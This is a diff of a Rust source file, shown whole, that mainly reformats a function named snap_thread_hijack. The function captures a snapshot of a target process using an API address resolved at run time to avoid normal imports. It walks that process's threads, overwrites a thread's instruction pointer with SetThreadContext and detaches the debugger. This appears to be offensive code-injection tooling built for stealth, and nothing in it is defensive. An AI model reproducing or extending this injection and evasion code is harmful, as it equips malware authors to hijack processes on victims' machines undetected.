@@ -1,13 +1,10 @@
 #![allow(unused_assignments)]
 #![allow(unused_variables)]
 #![allow(dead_code)]
+#![allow(unused_unsafe)]
 
 // Standard library imports
-use std::{
-    ffi::c_void as std_c_void,
-    mem::zeroed,
-    ptr::null_mut,
-};
+use std::{ffi::c_void as std_c_void, mem::zeroed, ptr::null_mut};
 
 // Third-party crates
 use Snapshotting_rs::ProcessSnapshot;
@@ -20,21 +17,22 @@ use winapi::{
         winerror::ERROR_SUCCESS,
     },
     um::{
-        debugapi::DebugActiveProcessStop, heapapi::{GetProcessHeap, HeapAlloc, HeapFree}, memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory}, processthreadsapi::SetThreadContext, winnt::{
-            CONTEXT, 
-            HANDLE, 
-            HEAP_ZERO_MEMORY, 
-            MEMORY_BASIC_INFORMATION,
-            MEM_IMAGE, 
-            PAGE_EXECUTE_READ,
-            PAGE_READWRITE,
-        }
+        debugapi::DebugActiveProcessStop,
+        heapapi::{GetProcessHeap, HeapAlloc, HeapFree},
+        memoryapi::{ReadProcessMemory, VirtualProtectEx, WriteProcessMemory},
+        processthreadsapi::SetThreadContext,
+        winnt::{
+            CONTEXT, HANDLE, HEAP_ZERO_MEMORY, MEMORY_BASIC_INFORMATION, MEM_IMAGE,
+            PAGE_EXECUTE_READ, PAGE_READWRITE,
+        },
     },
 };
 
 // Windows-rs imports
 use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
-    PssCaptureSnapshot, PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY, PSS_VA_SPACE_ENTRY, PSS_WALK_THREADS, PSS_WALK_VA_SPACE
+    PssWalkMarkerCreate, PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_CAPTURE_FLAGS,
+    PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY, PSS_VA_SPACE_ENTRY,
+    PSS_WALK_THREADS, PSS_WALK_VA_SPACE,
 };
 
 pub fn get_helper(
@@ -312,33 +310,33 @@ pub fn snap_thread_hijack(
         let win32_handle = windows::Win32::Foundation::HANDLE(target_process as _);
 
         //get the function address for PssCaptureSnapshot
-        let pss_capture_snapshot_address = noldr::get_function_address(kernel32, "PssCaptureSnapshot");
+        let pss_capture_snapshot_address =
+            noldr::get_function_address(kernel32, "PssCaptureSnapshot");
 
         let pss_capture_snapshot = unsafe {
             let fn_ptr = match pss_capture_snapshot_address {
                 Some(addr) => addr,
-                None => return false, // or handle error appropriately
+                None => return false,
             };
-            
-            std::mem::transmute::<_, extern "system" fn(
-                HANDLE,                 // processHandle
-                PSS_CAPTURE_FLAGS,      // captureFlags
-                u32,                    // threadContextFlags
-                *mut HPSS              // snapshotHandle
-            ) -> u32>(fn_ptr)
+
+            std::mem::transmute::<
+                _,
+                extern "system" fn(HANDLE, PSS_CAPTURE_FLAGS, u32, *mut HPSS) -> u32,
+            >(fn_ptr)
         };
 
-        let pss_result = unsafe {
-            pss_capture_snapshot(
-                target_process,                 // Already a *mut c_void
-                capture_flags,  // PSS_CAPTURE_FLAGS enum
-                0x0010_0017,                    // threadContextFlags as u32
-                &mut snapshot_handle            // *mut HPSS
-            )
-        };
+        let pss_result = pss_capture_snapshot(
+            target_process,
+            PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT,
+            0x0010_0017,
+            &mut snapshot_handle,
+        );
 
         if pss_result != 0 {
-            eprintln!("[!] PssCaptureSnapshot failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
+            eprintln!(
+                "[!] PssCaptureSnapshot failed: Win32 error {}",
+                winapi::um::errhandlingapi::GetLastError()
+            );
             return false;
         }
         //println!("[+] Snapshot captured successfully");
@@ -348,7 +346,10 @@ pub fn snap_thread_hijack(
         // Create walk marker
         let pss_result = PssWalkMarkerCreate(None, &mut walk_marker_handle);
         if pss_result != 0 {
-            eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
+            eprintln!(
+                "[!] PssWalkMarkerCreate failed: Win32 error {}",
+                winapi::um::errhandlingapi::GetLastError()
+            );
             return false;
         }
         //println!("[+] Walk marker created successfully");
@@ -380,7 +381,7 @@ pub fn snap_thread_hijack(
 
                     //println!("[+] Original thread entry context record: {:p}", thread_entry.ContextRecord);
                     //println!("[+] Thread ID we're targeting: {}", thread_id);
-                    //println!("[+] Process creation flags included DEBUG_PROCESS: {}", 
+                    //println!("[+] Process creation flags included DEBUG_PROCESS: {}",
                     //    NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS);
 
                     //println!("[+] Snapctx.Rip Before Setting: 0x{:x}", snapshot_ctx.Rip);
@@ -400,12 +401,15 @@ pub fn snap_thread_hijack(
                     //println!("[+] Setting thread context...");
 
                     if SetThreadContext(thread_handle, &snapshot_ctx) == FALSE {
-                        eprintln!("[!] SetThreadContext FAILED with Error: {}", winapi::um::errhandlingapi::GetLastError());
+                        eprintln!(
+                            "[!] SetThreadContext FAILED with Error: {}",
+                            winapi::um::errhandlingapi::GetLastError()
+                        );
                         return false;
                     }
 
                     std::thread::sleep(std::time::Duration::from_secs(5));
-                    
+
                     //println!("[+] DebugActiveProcessStop...");
                     DebugActiveProcessStop(pid);
                     //println!("[+] DONE");
@@ -424,7 +428,10 @@ pub fn snap_thread_hijack(
         // Free walk marker
         let pss_result = PssWalkMarkerFree(walk_marker_handle);
         if pss_result != 0 {
-            eprintln!("[!] PssWalkMarkerFree failed: Win32 error {}", winapi::um::errhandlingapi::GetLastError());
+            eprintln!(
+                "[!] PssWalkMarkerFree failed: Win32 error {}",
+                winapi::um::errhandlingapi::GetLastError()
+            );
             return false;
         }
 
